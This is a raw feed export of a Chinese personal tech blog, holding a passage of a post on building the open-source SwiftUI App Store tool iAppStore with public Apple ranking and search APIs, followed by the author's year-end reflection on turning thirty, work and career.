排行榜，方便日常查看，同时查看信息，搜索或应用发布状态订阅等功能，解决了非常多的痛点问题。</p><h3 id="二、效果展示"><a href="#二、效果展示" class="headerlink" title="二、效果展示"></a>二、效果展示</h3><p>首先，我们先来介绍一下，目前 iAppStore 实现了那些功能。</p><blockquote><p><a href="https://github.com/37iOS/iAppStore-SwiftUI">iAppStroe</a> 是一款使用 <strong>SwiftUI</strong> 打造的苹果商店工具类 App。</p></blockquote><ol><li>提供苹果实时榜单查询，包含 iOS 和 iPad 的热门免费榜、热门付费榜、畅销榜，还有新上架榜、新上架免费榜、新上架付费榜等。</li><li>提供查询 app 详细页面内容、搜索 app、订阅 app 状态等功能。</li><li>支持苹果所有国家和地区的商店，无需切换 Apple Id，即可查看！</li></ol><h4 id="2-1-排行榜"><a href="#2-1-排行榜" class="headerlink" title="2.1 排行榜"></a>2.1 排行榜</h4><p>首先，App Store 的榜单有很多，包含 iOS 和 iPad 的热门免费榜、热门付费榜、畅销榜，还有新上架榜、新上架免费榜、新上架付费榜等，我们都实现了这些榜单。另外，我们将 App Store 榜单的 UI 还原，同时，也增加了更多的信息展示，比如 App 所属分类等。</p><p><img src="https://ihtcboy.com/images/2022-iAppStore-04.jpg" alt="iAppStore-04"></p><p>最重要的是，我们把所有国家和地区的商店，都集成在一个面板中，通过下拉列表选择，实现快速切换榜单。</p><h4 id="2-2-App-详细页"><a href="#2-2-App-详细页" class="headerlink" title="2.2 App 详细页"></a>2.2 App 详细页</h4><p>App 详细页面，把开发者最关心的参数显示在最前面。另外，复制包含或者 App ID 是一个高频的需求，App 描述和更新方案也高仿了 App Store 的效果。预览区包含 iPhone 和 iPad 图片。点击可以显示大图，并且可以下载和分享大图。</p><p><img src="https://ihtcboy.com/images/2022-iAppStore-05.jpg" alt="iAppStore-05"></p><h4 id="2-3-搜索"><a href="#2-3-搜索" class="headerlink" title="2.3 搜索"></a>2.3 搜索</h4><p>搜索区，可以输入<code>关键字</code>模糊搜索，或者 <code>App ID</code>精准搜索。另外，在右上角切换国家和地区，显示不同地区的 App 搜索。</p><p><img src="https://ihtcboy.com/images/2022-iAppStore-06.jpg" alt="iAppStore-06"></p><h4 id="2-4-应用状态订阅"><a href="#2-4-应用状态订阅" class="headerlink" title="2.4 应用状态订阅"></a>2.4 应用状态订阅</h4><p>这个状态订阅是什么意思？就是可以监听 App 在商店的状态，举例来说，App 发布了新版本，那么大概要多久才能在商店上显示呢？所以，我们可以通过苹果的接口，来定时的查询 App 的状态，从而知道 App 什么时候生效。还有新 App 刚刚发布时、或者 App 需要下架了，什么时候才从商店消失等。</p><p><img src="https://ihtcboy.com/images/2022-iAppStore-07.jpg" alt="iAppStore-07"></p><h4 id="2-5-其它"><a href="#2-5-其它" class="headerlink" title="2.5 其它"></a>2.5 其它</h4><p>为了方便开发者使用，App 列表长按时，会弹出操作列表，可以已经复制 App 的信息或者快速打开 App Store 产品页，尽可能的快捷获取内容！另外，还支持暗黑模式，依然精美绝伦！切换图标可以选择自己显示的图标等。</p><p><img src="https://ihtcboy.com/images/2022-iAppStore-08.jpg" alt="iAppStore-08"></p><p>大家想要什么功能，可以在评论区留言啊~</p><h3 id="三、调研工作"><a href="#三、调研工作" class="headerlink" title="三、调研工作"></a>三、调研工作</h3><p>接下来，我们说一下要实现以上功能，需要的 API 怎么调研出来的！通过大量的网页检索，最终测试后整理成有价值的列表：</p><h4 id="3-1-榜单接口"><a href="#3-1-榜单接口" class="headerlink" title="3.1 榜单接口"></a>3.1 榜单接口</h4><p><strong>查询排行榜的 API 示例</strong></p><table><thead><tr><th>链接示例</th><th>链接说明</th><th>参考链接</th></tr></thead><tbody><tr><td><code>https://rss.applemarketingtools.com/api/v2/cn/apps/top-free/100/apps.json</code></td><td>苹果官方提供的接口，除了 App 榜单，还支持苹果自家的 Music、Books、Podcasts 产品的榜单，目前提供前 200 条数据。</td><td><a href="https://rss.applemarketingtools.com/">RSS Builder</a></td></tr><tr><td><code>http://ax.itunes.apple.com/WebObjects/MZStoreServices.woa/ws/RSS/topfreeapplications/limit=100/json?cc=cn</code></td><td>Apple RSS Feeds，苹果旧的 RSS接口，目前提供前 100 条数据。</td><td><a href="https://www.apple.com/rss/">RSS Information</a></td></tr><tr><td><code>https://itunes.apple.com/cn/rss/topfreeapplications/limit=100/json</code></td><td>苹果榜单查询接口，目前提供前 100 条数据。</td><td><a href="https://stackoverflow.com/questions/29997991/how-to-get-top-400-lists-from-itunes">Stack Overflow</a></td></tr><tr><td><code>https://itunes.apple.com/rss/topGrossingApplications/limit=100/json?cc=cn</code></td><td>苹果榜单查询接口，目前提供前 100 条数据。把地区语言放到单独成一个字段。</td><td><a href="https://www.kalman03.com/2015/05/04/tech/appstore_affiliates_resource/">链接</a></td></tr></tbody></table><p>以上内容在苹果公开的文档，都没有查询到 API 文档。但为苹果网站到在一个页面：<br><a href="https://affiliate.itunes.apple.com/resources/">Apple Services Performance Partners</a>，其中一项服务叫：<a href="https://affiliate.itunes.apple.com/resources/documentation/itunes-enterprise-partner-feed/">Enterprise Partner Feed Relational</a>（企业信息流合作伙伴？），目前这个合作好像很难申请到。所以，相关的文档链接都无法访问到，比如 <a href="https://affiliate.itunes.apple.com/resources/documentation/itunes-store-web-service-search-api.html">https://affiliate.itunes.apple.com/resources/documentation/itunes-store-web-service-search-api.html</a>。</p><p>那么以上链接中几个参数类型，因为没有文档，所以调研梳理如下：</p><p><strong>榜单类型</strong></p><table><thead><tr><th>字段</th><th>英文说明</th><th>解析</th></tr></thead><tbody><tr><td>topFreeApplications</td><td>Top Free Applications</td><td>热门免费应用</td></tr><tr><td>topPaidApplications</td><td>Top Paid Applications</td><td>热门付费应用</td></tr><tr><td>topGrossingApplications</td><td>Top Grossing Applications</td><td>畅销榜(收入最高)</td></tr><tr><td>newApplications</td><td>New Applications</td><td>新应用</td></tr><tr><td>newFreeApplications</td><td>New Free Applications</td><td>新的免费应用</td></tr><tr><td>newPaidApplications</td><td>New Paid Applications</td><td>新的付费应用</td></tr><tr><td>topFreeiPadApplications</td><td>Top Free iPad Applications</td><td>热门免费 iPad 应用</td></tr><tr><td>topPaidiPadApplications</td><td>Top Paid iPad Applications</td><td>热门付费 iPad 应用</td></tr><tr><td>topGrossingiPadApplications</td><td>Top Grossing iPad Applications</td><td>最畅销的 iPad 应用</td></tr></tbody></table><p><strong>应用分类</strong></p><table><thead><tr><th>分类 ID</th><th>英文说明</th><th>解析</th></tr></thead><tbody><tr><td>6000</td><td>Business</td><td>商务</td></tr><tr><td>6001</td><td>Weather</td><td>天气</td></tr><tr><td>6002</td><td>Utilities</td><td>工具</td></tr><tr><td>6003</td><td>Travel</td><td>旅游</td></tr><tr><td>6004</td><td>Sports</td><td>体育</td></tr><tr><td>6005</td><td>Social Networking</td><td>社交</td></tr><tr><td>6006</td><td>Reference</td><td>参考资料</td></tr><tr><td>6007</td><td>Productivity</td><td>效率</td></tr><tr><td>6008</td><td>Photo &amp; Video</td><td>摄影与录像</td></tr><tr><td>6009</td><td>News</td><td>新闻，中国区无数据⚠️</td></tr><tr><td>6010</td><td>Navigation</td><td>导航</td></tr><tr><td>6011</td><td>Music</td><td>音乐</td></tr><tr><td>6012</td><td>Lifestyle</td><td>生活</td></tr><tr><td>6013</td><td>Health &amp; Fitness</td><td>健康健美</td></tr><tr><td>6014</td><td>Games</td><td>游戏</td></tr><tr><td>6015</td><td>Finance</td><td>财务</td></tr><tr><td>6016</td><td>Entertainment</td><td>娱乐</td></tr><tr><td>6017</td><td>Education</td><td>教育</td></tr><tr><td>6018</td><td>Books</td><td>图书</td></tr><tr><td>6019</td><td>Places &amp; Objects</td><td>地点与物品，字段已无效⚠️</td></tr><tr><td>6020</td><td>Medical</td><td>医疗</td></tr><tr><td>6021</td><td>Newsstand</td><td>报刊杂志</td></tr><tr><td>6022</td><td>Catalogs</td><td>商品指南，字段已无效⚠️</td></tr><tr><td>6023</td><td>Food &amp; Drink</td><td>美食佳饮</td></tr><tr><td>6024</td><td>Shopping</td><td>购物</td></tr><tr><td>6025</td><td>Stickers</td><td>iMessage 贴纸，字段已无效⚠️</td></tr><tr><td>6026</td><td>Developer_Tools</td><td>软件开发工具</td></tr><tr><td>6027</td><td>Graphics_And_Design</td><td>图形和设计</td></tr></tbody></table><blockquote><p>更多分类，参考苹果网站的 HTML 标签：<a href="https://apps.apple.com/cn/genre/ios/id36">App Store</a></p></blockquote><p><strong>国家或地区标识</strong></p><table><thead><tr><th>ID</th><th>英文说明</th><th>解析</th></tr></thead><tbody><tr><td>cn</td><td>China mainland</td><td>中国</td></tr><tr><td>hk</td><td>Hong Kong</td><td>中国香港</td></tr><tr><td>tw</td><td>Taiwan</td><td>中国台湾</td></tr><tr><td>mo</td><td>Macao</td><td>中国澳门</td></tr><tr><td>us</td><td>United States</td><td>美国</td></tr><tr><td>jp</td><td>Japan</td><td>日本</td></tr><tr><td>kr</td><td>Korea, Republic of</td><td>韩国</td></tr></tbody></table><blockquote><p>更多分类标识，参考苹果网站的 HTML 标签：<a href="https://rss.applemarketingtools.com/">RSS Builder</a></p></blockquote><p><strong>接口说明</strong></p><p>原本接口提供 200 条数据查询，但 20221 年 9 月 2 日，苹果接口调整后，大幅削减 App Store 应用排行数据分享，从 1500 名降至 200 名。目前 AppStore 总榜、应用、游戏榜、分类榜只能查看前 200 个 App 的数据。</p><h4 id="3-2-搜索接口"><a href="#3-2-搜索接口" class="headerlink" title="3.2 搜索接口"></a>3.2 搜索接口</h4><p>App 搜索接口比如简单，并且有官方文档：</p><ul><li><a href="https://affiliate.itunes.apple.com/resources/documentation/itunes-store-web-service-search-api/">iTunes Store API</a></li><li><a href="https://developer.apple.com/library/archive/documentation/AudioVideo/Conceptual/iTuneSearchAPI/Searching.html#//apple_ref/doc/uid/TP40017632-CH5-SW1">iTunes Search API: Constructing Searches</a></li></ul><p><strong>接口示例：</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="variable">s:</span>//itunes.apple.<span class="keyword">com</span>/<span class="built_in">search</span>?term=斗罗大陆&amp;country=<span class="keyword">cn</span>&amp;limit=<span class="number">200</span>&amp;entity=software</span><br></pre></td></tr></table></figure><p><code>term</code> 字段就是关键词，<code>country</code> 字段是国家或地区的标签，跟上面的榜单接口是同一个。<code>entity=software</code> 固定为搜索软件就好。详细的使用，可以参考官方文档，这里就不展开了。</p><h4 id="3-3-App-详细信息"><a href="#3-3-App-详细信息" class="headerlink" title="3.3 App 详细信息"></a>3.3 App 详细信息</h4><p>查询某个 App 可以使用 <code>lookup</code> 接口，具体可以查看官网文档：<a href="https://developer.apple.com/library/archive/documentation/AudioVideo/Conceptual/iTuneSearchAPI/LookupExamples.html#//apple_ref/doc/uid/TP40017632-CH7-SW1">Lookup Examples</a>。</p><p><strong>接口示例：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//i</span>tunes.apple.com<span class="regexp">/cn/</span>lookup?id=<span class="number">1558453472</span></span><br></pre></td></tr></table></figure><h4 id="3-4-App-评论内容"><a href="#3-4-App-评论内容" class="headerlink" title="3.4 App 评论内容"></a>3.4 App 评论内容</h4><p>查询某个 App 的用户评论内容，没有在苹果的文档中找到，但是根据以上的调研，接口使用问题不大。</p><p><strong>接口示例：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//i</span>tunes.apple.com<span class="regexp">/cn/</span>rss<span class="regexp">/customerreviews/i</span>d=<span class="number">989673964</span><span class="regexp">/sortBy=mostRecent/</span>json</span><br></pre></td></tr></table></figure><p>地区、App Id、<code>sortBy</code> 字段，就可以搜索。如果需要分页或者获取更多，可以参考文末的链接。</p><h3 id="四、开发思路"><a href="#四、开发思路" class="headerlink" title="四、开发思路"></a>四、开发思路</h3><p>有了以上的 API 接口，就能实现我们的 App，这样使用 SwiftUI 来构建，现已开源：</p><ul><li><a href="https://github.com/37iOS/iAppStore-SwiftUI">iAppStore - GitHub</a></li></ul><p>详细的实践过程就不在这样讲解了，因为 App 是工具类应用，交互的内容不多，所以并不是很复杂。当然，使用 SwiftUI 构建 UI 过程异常的快速，但是如果要调整 UI 细节，确定需要花很多心思。比如，SwiftUI 还不支持 WebView，所以用 SFSafariViewController 桥接的 View 在 SwiftUI 组件中显示会异常。</p><ul><li><a href="https://stackoverflow.com/questions/56518029/how-do-i-use-sfsafariviewcontroller-with-swiftui">How do I use SFSafariViewController with SwiftUI? - Stack Overflow</a></li></ul><p>另外，就是苹果 API 的坑，接口返回的字段 <code>im:id</code>、<code>im:bundleId</code>，包含冒号，让人怀疑人生！最后，通过自定义键值名，解决了解析映射的问题。详细，可以参考源代码中 <a href="https://github.com/37iOS/iAppStore-SwiftUI/blob/main/iAppStore/Models/AppRank.swift">AppRank.swift</a> 类。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IDAttributes</span>: <span class="title">Codable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> imBundleID, imID: <span class="type">String</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 自定义键值名</span></span><br><span class="line">     <span class="class"><span class="keyword">enum</span> <span class="title">CodingKeys</span>: <span class="title">String</span>, <span class="title">CodingKey</span> </span>&#123;</span><br><span class="line">        <span class="keyword">case</span> imID <span class="operator">=</span> <span class="string">&quot;im:id&quot;</span></span><br><span class="line">        <span class="keyword">case</span> imBundleID <span class="operator">=</span> <span class="string">&quot;im:bundleId&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>综上，如果是个人开发的 App，可以开始使用 SwiftUI 来开发，毕竟原生的体验和原生的组件，用户起来也很快乐。另外，不考虑支持低版本系统，使用 <a href="https://developer.apple.com/sf-symbols/">SF Symbols</a> 提供的图标，也非常的友好！</p><h3 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h3><p>iAppStore 从构思到实现，花了半个月的时间，期间调研接口和调试接口花了很多时间，网上依然看到很多人问这些接口，相信很多开发者都不知道有这些接口，所以本文也算是一个答案总结，希望这个问题从此消失哈~ </p><p>最后，iAppStore 只是从编者需求来实现的一个产品，所以一定存在很多的问题，但同时它是一个开源项目，所以，如果大家有兴趣，一起来参与，增加更多有趣或者黑科技的体验吧！</p><p>欢迎大家有任何想法或者建议，可以在评论区给我们反馈。也可以到 <a href="https://github.com/37iOS/iAppStore-SwiftUI">iAppStore - GitHub</a> 给我们 Star 鼓励！感谢大家~</p><p>欢迎大家在评论区一起交流~</p><blockquote><p>欢迎关注我们，了解更多 iOS 和 Apple 的动态~</p></blockquote><h3 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h3><ul><li><a href="https://stackoverflow.com/questions/29997991/how-to-get-top-400-lists-from-itunes">app store - How to get top 400 lists from iTunes - Stack Overflow</a></li><li><a href="https://stackoverflow.com/questions/1801182/how-can-i-use-appstore-api-to-get-top100-list-what-is-the-common-architecture-t">web services - How can I use Appstore API to get top100 list? What is the common architecture to build a appstore application website? - Stack Overflow</a></li><li><a href="https://www.zhihu.com/question/29427568/answer/261315466">如何查询某个app在appstore特定关键词搜索下的排名？ - 知乎</a></li><li><a href="https://www.kalman03.com/2015/05/04/tech/appstore_affiliates_resource/">AppStore应用排行榜、应用获取接口 | 安琪琪</a></li><li><a href="https://affiliate.itunes.apple.com/resources/documentation/itunes-enterprise-partner-feed/">iTunes Enterprise Partner Feed</a></li><li><a href="https://rss.applemarketingtools.com/">RSS Builder</a></li><li><a href="https://www.apple.com/rss/">RSS Information - Apple</a></li><li><a href="https://discussions.apple.com/thread/252568207">RSS for Top Movies got no results - Apple Community</a></li><li><a href="https://www.rubydoc.info/gems/store_api/0.2.2/StoreApi/AppStore">Module: StoreApi::AppStore — Documentation for store_api (0.2.2)</a></li><li><a href="https://www.ithome.com/0/576/011.htm">苹果大幅削减 App Store 应用排行数据分享，从 1500 名降至 200 名 - IT之家</a></li><li><a href="https://apps.apple.com/cn/genre/ios/id36">从 iTunes 下载的 App Store</a></li><li><a href="https://affiliate.itunes.apple.com/resources/documentation/itunes-store-web-service-search-api/">iTunes Store API</a></li><li><a href="https://developer.apple.com/library/archive/documentation/AudioVideo/Conceptual/iTuneSearchAPI/Searching.html#//apple_ref/doc/uid/TP40017632-CH5-SW1">iTunes Search API: Constructing Searches</a></li><li><a href="https://developer.apple.com/library/archive/documentation/AudioVideo/Conceptual/iTuneSearchAPI/LookupExamples.html#//apple_ref/doc/uid/TP40017632-CH7-SW1">iTunes Search API: Lookup Examples</a></li><li><a href="https://rstudio-pubs-static.s3.amazonaws.com/267315_46f1f9b894014a588e4a65e3fe4926ff.html">Analysis of PodCruncher App Ratings and Reviews on iTunes</a></li><li><a href="https://greedlab.com/blog/apple/rss-app-reviews.html">监听 iOS App 新评论 · Bell’s blog</a></li><li><a href="https://tools.applemediaservices.com/">Marketing Tools and Resources - Apple Services</a></li><li><a href="https://github.com/37iOS/iAppStore-SwiftUI">37iOS/iAppStore-SwiftUI - GitHub</a></li><li><a href="https://stackoverflow.com/questions/56518029/how-do-i-use-sfsafariviewcontroller-with-swiftui">ios - How do I use SFSafariViewController with SwiftUI? - Stack Overflow</a></li><li><a href="https://developer.apple.com/sf-symbols/">SF Symbols - Apple Developer</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文首发于 &lt;a href=&quot;https://juejin.cn/post/7051512478630412301&quot;&gt;用 SwiftUI 实现一个开源的 App Store - 掘金&lt;/a&gt;，欢迎关注我们 &lt;a href=&quot;https://juejin.cn/user/1002387318511214&quot;&gt;@37手游iOS技术运营团队&lt;/a&gt; 。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;作者：iHTCboy&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;App Store 在 iOS 11 之前，App 排行榜一直是衡量开发者 App 活跃度的指标，但在 iOS 11 后苹果弱化了榜单功能，改为了二级入口，导致查询榜单困难，编者通过深入调研最终实现了一个查看 App 榜单、搜索、信息、发布生效等强大功能的开源 App。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="iOS" scheme="https://ihtcboy.com/tags/iOS/"/>
    
    <category term="SwiftUI" scheme="https://ihtcboy.com/tags/SwiftUI/"/>
    
    <category term="App Store" scheme="https://ihtcboy.com/tags/App-Store/"/>
    
  </entry>
  
  <entry>
    <title>二零二一，三十而立</title>
    <link href="https://ihtcboy.com/2022/01/01/2022-01-01_2021/"/>
    <id>https://ihtcboy.com/2022/01/01/2022-01-01_2021/</id>
    <published>2021-12-31T16:00:01.000Z</published>
    <updated>2022-03-12T04:04:32.348Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>“子曰：<br>‘吾十有五而志于学，三十而立，四十而不惑，五十而知天命，六十而耳顺，七十而从心所欲，不逾矩。’”</p><p>——— 《论语·为政》</p></blockquote><h3 id="一、序言"><a href="#一、序言" class="headerlink" title="一、序言"></a>一、序言</h3><p>2021年也经历了很多事情，正好 <strong>三十而立</strong>，一般的理解 <code>立</code> 是<strong>有所成就</strong>，但每个人对 “有所成就” 的理解并不一样，有人理解为 <code>事业有成</code>，而我理解是 <code>立心</code>。</p><span id="more"></span><p>对于博主来说，<strong>三十岁的立心，是对自己的言行品德的立</strong>，承担更多的角色责任，儿子、丈夫、女婿，甚至是父亲/爷爷。所以，独立承担责任，顶天立地，对自己对他们负责，没有偏见，良好德行等，对生活充满自信，对未来充满期待，这也许就是三十而立的初心。怎么理解三十岁？你应该有自己的见解。</p><h3 id="二、“卷”技术"><a href="#二、“卷”技术" class="headerlink" title="二、“卷”技术"></a>二、“卷”技术</h3><p>关于技术，学习方面已经没有什么说，掘金、公众号等，很多技术学习平台每天都有无数的技术文章分享，学习总是不会结束。而技术方面的问题，可能大家一直争论的都是非技术问题？比如 <code>PHP</code> 是不是最好的语言。</p><ul><li>用 Git 命令，还是 Sourcetree ？</li><li>用 macOS 还是 Windows ？</li><li>挤牙膏 Intel、Arm、M1 谁更未来 ？</li></ul><p>对于技术的争议，有了一定的经验和积累后，都不想多说话了，因为，世界上并没有最好的技术，只有最合适的技术。希望大家以后减少这样的争论，做更多的技术实践和创新，才是正道~</p><p>随着(移动)互联网红利消失，技术红利也消失了，因为互联风的“基建”已经非常的完善，基础的技术已经内卷不得了。建立一个网站、开发一个 app、复制一个小程序，所有服务都上云，留给开发者的红利机会也不再多了。另一方面，技术需要创新，需要突破，但技术发展并不会像技术应用那样，可以快速的迭代。</p><p>十年前云计算概念很火，如今万事皆上云！成为了互联网的基石，而今天，AI/AR/VR/MR/云宇宙等概念，开始火爆。正因为互联网的基建完成，为更多的技术提供了 <code>应用</code> <code>实用</code> 的可能性。就像识别带口罩的人脸，环境和市场的发展，一环扣一环，用发展的眼光看技术未来~</p><h3 id="三、程序员和工程师"><a href="#三、程序员和工程师" class="headerlink" title="三、程序员和工程师"></a>三、程序员和工程师</h3><p>2021年，说的最多的关键字 <code>卷</code>，“卷”技术已经成为如今技术圈里热门的话题。但如果仔细思考，其实卷的还是现有的技术，核心的技术和创新的技术，依然还有非常大的空间，但也需要更多的时间积累。我们还缺少这样的气候，不仅要分到更多的蛋糕，还能把蛋糕做大。</p><p>很多人比较了国内和国外的程序员，但是我认为他们比较的不是同一种岗位。中国 <code>卷</code> 的更多是程序员，更多是满足业务和需求的程序员，因为中国需要大量的开发人员来堆业务，往往只需要实现业务功能就可以，就如工厂的流水线工人。按着标准和固定的步骤，就能完成开发，这就是中国特色的程序员，也是有点无奈，毕竟我们以前家底薄。</p><p>如今 2022 年往后，我们需要怎么样的程序员呢？<strong>工程师</strong>是不是更加高大上的称呼，程序员和工程师有什么区别？以前读大学时，确实没有深入的体会，也没有深入的思考。</p><p>读书时我们按部就班，题海战术，完成每科考试，修够学分，毕业后全部都抛到脑后。工作后，忙碌完成各种需求和业务迭代开发，管中窥豹，接触各种新技术框架，但又不能形成全局观，迷惘又无法参透。相信很多朋友都有这样的体会，如果没有经历和思考，又怎么能想到解决方法？</p><ol><li>高级工程师</li><li>资深工程师（主管）</li><li>专家（经理）</li><li>高级专家（资深经理）</li><li>资深专家（总监）</li><li>研究员（资深总监）</li><li>CTO（CEO）</li></ol><p>我们有没有思考过，以上的职称是怎么衡量，我们又怎么定位自己？</p><p>比如，<strong>技术架构师和业务架构师</strong>，一个技术专家未必是一个优秀的业务架构师。</p><p>对于一个技术人员来说，首先需要更多的技术框架思考和学习，形成良好的系统设计思维，逻辑严谨，纵览全局，从点到线，解决更多问题，积累优秀的解决方案，从线到面，触类旁通，融会贯通，最后给出自己的解决方案！</p><p>技术架构师是技术通用的解决方案，而业务架构师，则需要对行业了如指掌，针对行业的特点定制业务解决方案。成为架构师，可能技术只是基础的一方面，更多的思维和能力，要学会多角度、多侧面地去考虑问题，而不要执迷不悟，钻牛角尖。</p><blockquote><p>当然，大家不必一定往技术一路走到黑，对于自己的思考，才是最重要的。</p></blockquote><h3 id="四、工作"><a href="#四、工作" class="headerlink" title="四、工作"></a>四、工作</h3><p>除了我们的技术核心，我们的大部分时间就是工作。其实对于自己来说，工作内容比较敏感不方便说，所以更多谈一下通用性的问题。</p><p><strong>圈子</strong></p><p>当我们在职场工作多年后，我们的圈子基本都相对固定，虽然有微博、抖音、B站、技术群等，越来越多的技术 up 主，但是我们每天跟谁交流？</p><p><strong>摸鱼</strong></p><p><code>摸鱼心态，假装很努力</code>。不需要 8 个小时都努力工作，我们每件事做到了百分百的认真了吗？微信的个人状态，有一个 <code>摸鱼</code> 状态，我至今没有搞明白，它是褒义词、贬义词、中性词。感觉摸鱼变成了一种光明正大的状态，我不清楚这对于广大的青少年是毒害还是磨炼。</p><p><strong>初心</strong></p><p><code>组织的利益和个人利益</code>。我以前为组织做事，总是站在组织的利益角度考虑，如果与个人利益冲突，还是以保证组织利益为先。其实，工作的初心是什么，满足自己金钱的需求，成长发展的需求，而组织的需求到底怎么满足？怎么做到共赢？</p><p><strong>标准</strong></p><p>千差万别，沟通的理解，也有猜测。我们工作中，传达指令时，往往上级或下级，与我们想传达的内容有偏差，甚至相反的效果。所以，从个人角色来说，掌握好标准的沟通技巧，和必要的重复确认沟通，依然是无法通过技术来解决的。</p><p><strong>无限</strong></p><p><code>不缺问题，缺解决方案</code>。以前我总认为，工作可以做完，后来慢慢意识到，工作永远做不完。因为，工作永远不缺问题，缺的是发现问题和解决问题的方案。</p><h3 id="五、生活"><a href="#五、生活" class="headerlink" title="五、生活"></a>五、生活</h3><p>除了工作，我们还有自己的私生活，在公司面对同事老板，在家里面对另一伴、父母或亲友。其实工作也是生活的一部分，我们人际交流的需求，其实是相同的底层逻辑，只是我们忘记或停止了思考，认为理所当然了。</p><p><strong>真诚不装</strong></p><p><code>赞美？表扬？pua？</code>你的另一伴给你买了新衣服，你有表扬过 ta 吗？很多时候，工作上你赞扬上级，可能会被人认为拍马屁，久而久之，你就缺乏了表扬的脑回路。回到家，对于一件事，也理所当然的认为是应该的。所以，思考一下，你觉得理所当然？</p><p><strong>努力和毅力</strong></p><p>互联网技术带来的商业红利期逐渐过去了，中彩票式的财富急剧增长故事已不再有。以往可能只需要一点努力就可以获取成就，现在很努力可能已经不可行了。年轻人出头机会少，多劳者并不一定多得，所以，我认为有坚持不懈的毅力，往正确的方向走，才能获得成就。</p><p><strong>明智</strong></p><p><code>知人者智，自知者明。</code> 如果不了解每个人想要什么，那你怎么给别人。每当别人遇到困难或者不开心时，我们总是从我们过来人的思维，误以为可以给别人解忧。但是奇怪的事，当我们自己遇到困难或心情低落时，我们却无法给自己解脱！知道自己想什么吗？</p><p><strong>心态</strong></p><p>我们生活中有很多闯红灯发生的意外，但是我们在生活中闯红灯的人依然在！他们不吸取教训，依然去抢红灯，通常情况下不会发现意外，但忽视了墨菲定律，生命只有一次。另外一个现象是，聊天群里抢红包，不管抢到多少钱，那怕只有一分钱，只要能抢到就很开心。这样的心理学现象，大家都知道，但被人利用。所以，为什么我们懂了很多道理，却依然过不好这一生？</p><p><strong>定位</strong></p><p><code>用户定位</code>？产品定位？我们经常会给我们开发的项目进行产品定位，目标用户分析等，反过来，我们有没有给自己分析自己？有没有什么方式或指标，对自己的定位，有明确或科学的认识？</p><p>是一直做技术开发，还是换赛道当老板？</p><h3 id="六、思考（格局）"><a href="#六、思考（格局）" class="headerlink" title="六、思考（格局）"></a>六、思考（格局）</h3><p>今年流行的一句话：<code>格局一下子打开了！</code></p><p><strong>认知</strong></p><p>一个人只能挣到思维认知下的钱，<strong>提升思维认知</strong>。不同收入人群看待问题的角度和起点是不一样的，假如你在世界五百强企业，你见识过业务流水和利益以 <code>亿</code> 为单位计算时，你就会有不一样的认识。</p><p>举例来说，目前谷歌 Play 商店每年前 100 万美元收入抽15%，超过后30%。如果你的企业每个月都超出了 100 万美元，那么这个政策就变得没有那么重要了。相反，你可能想争取更多的权益，这就是今天反垄断不停的源头。资本如果有百分之五十的利润，它就会铤而走险，如果有百分之百的利润，它就敢践踏人间一切法律，如果有百分之三百的利润，它就敢犯下任何罪行。所以，你认知了吗</p><p><strong>理解</strong></p><p>同一个东西，在不同的角度，大家的理解也不相同。面试造飞机，工作造轮子，工作不是拧螺丝吗？举例来说，开发 app 的找回密码、绑定手机功能，从我们技术理解，他们可能就是直白的找回密码、绑定手机。并没有人给他们赋予更加深刻的理解，而产品经理的角度，<code>找回密码</code> 是客服功能，而 <code>绑定手机</code>是用户功能。所以，你理解了吗</p><p><strong>边界</strong></p><p><code>对你们公司到底如何赚钱，你有一个比较清晰的认知吗？</code>。生产要素里面不仅仅有技术要素，同时还有土地要素、资本要素、数据要素等等，工程师，除了技术，还了解什么？</p><p><strong>沸腾</strong></p><p>一直以为自己经历的 2008~2020 年，有比较深的理解，但当我看了《沸腾新十年》，才发现自己经历只是经历了，其实只是过路人的角色，并没有思考和总结，沸腾不起来。</p><p>十年后的自己是怎么样？十年后的行业、世界，又发生了什么变化？</p><p><strong>赛道</strong></p><p>未来 10 年到 20 年的赛道是什么？</p><p>我们可以对当下的技术或问题，发表它们未来的走向和趋势，但是我们没有想象过，它们聚合起来后的未来应该是怎么样？或者可以怎么样？</p><p><strong>速度</strong></p><p><code>欲速则不达</code>。不是不追求速度快，而是有积累经验的快。举例来说，试错的速度更快，距离达成就越近。</p><p><strong>经验</strong><br><code>眼见为实？</code></p><blockquote><p>如果有 10% 的利润，它就保证到处被使用；有 20% 的利润，它就活跃起来；有 50% 的利润，它就铤而走险；为了 100% 的利润，它就敢践踏一切人间法律；有 300% 的利润，它就敢犯任何罪行，甚至冒绞首的危险。</p></blockquote><p>这句话不是出自 马克思《资本论》，而是 托·约·登宁《工联和罢工》。</p><p><strong>心胸</strong><br><code>求同存异</code>。我们应该尽然做到追求意见一致，如果无法达成也能包含异议。但<code>人往往是自私</code>的，如果不是在危险的情况下，人都会有自私的想法或行为。区别对待的公平性问题，趋利避害人性的博弈论等。<br>心胸：心智和胸怀，如何做到时刻的心胸宽广、胸怀大志？</p><h3 id="七、小结（小抄）"><a href="#七、小结（小抄）" class="headerlink" 